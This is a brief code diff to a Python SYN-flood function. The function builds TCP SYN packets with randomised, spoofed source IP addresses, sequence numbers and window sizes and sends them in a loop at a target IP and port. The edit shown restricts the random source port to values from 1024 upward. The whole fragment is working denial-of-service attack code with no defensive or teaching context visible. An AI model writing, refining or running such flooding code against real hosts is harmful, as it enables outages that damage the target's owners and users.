@@ -22,7 +22,7 @@ def SYN_flood(Target_IP, dPort, packets_to_send):
     print("Sending packets to the target...")
     for i in range(packets_to_send):
         seq_n = random.randint(0, MAX_PORTS)
-        sPort = random.randint(0, MAX_PORTS)
+        sPort = random.randint(1024, MAX_PORTS)
         Window = random.randint(0, MAX_PORTS)
         src_ip = random_ip()
         packet = IP(dst=Target_IP, src=src_ip) / TCP(sport=sPort, dport=dPort, flags="S", seq=seq_n, window=Window)
